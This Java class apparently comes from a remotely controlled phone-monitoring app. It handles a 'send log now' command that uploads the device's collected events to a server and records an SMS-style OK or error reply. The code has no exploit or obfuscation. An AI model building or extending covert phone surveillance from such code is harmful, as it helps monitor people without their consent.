package com.vvt.rmtcmd.pcc;

import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.global.Global;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendEventCmdResponse;
import com.vvt.protmgr.SendEventManager;
import com.vvt.protmgr.PhoenixProtocolListener;
import com.vvt.rmtcmd.PhoneixCompliantCommand;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class PCCSendLogNowCommand extends PCCRmtCmdAsync implements PhoenixProtocolListener {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(PhoneixCompliantCommand.SENDING_EVENT);
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		try {
			eventSender.addListener(this);
			eventSender.sendEvents();
		} catch(Exception e) {
			FxSystemEvent systemEvent = new FxSystemEvent();
			systemEvent.setCategory(FxCategory.PCC_REPLY);
			systemEvent.setEventTime(System.currentTimeMillis());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			systemEvent.setSystemMessage(responseMessage.toString());
			db.insert(systemEvent);
			observer.cmdExecutedError(this);
		}
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("PCCSendLogNowCommand.execute.onError", "message: " + message);
		doSMSHeader();
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		systemEvent.setSystemMessage(responseMessage.toString());
		db.insert(systemEvent);
		eventSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void onSuccess(CmdResponse response) {
		if (response instanceof SendEventCmdResponse) {
			eventSender.removeListener(this);
			doSMSHeader();
			FxSystemEvent systemEvent = new FxSystemEvent();
			systemEvent.setCategory(FxCategory.PCC_REPLY);
			systemEvent.setEventTime(System.currentTimeMillis());
			SendEventCmdResponse sendEventRes = (SendEventCmdResponse)response;
			if (sendEventRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				observer.cmdExecutedSuccess(this);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendEventRes.getServerMsg());
				observer.cmdExecutedError(this);
			}
			systemEvent.setSystemMessage(responseMessage.toString());
			db.insert(systemEvent);
		}
	}
}
